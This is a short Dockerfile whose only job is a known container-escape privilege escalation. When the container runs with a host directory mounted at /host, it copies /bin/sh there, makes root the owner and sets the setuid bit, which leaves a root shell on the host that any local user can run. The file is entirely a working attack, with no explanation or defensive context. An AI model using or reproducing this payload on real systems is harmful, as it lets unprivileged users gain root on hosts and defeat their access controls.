FROM debian:jessie
RUN mkdir -p /host
ENTRYPOINT ["/bin/sh", "-c"]
CMD ["cp /bin/sh /host/rootshell \
      && chown root:root /host/rootshell \
      && chmod a+s /host/rootshell"]
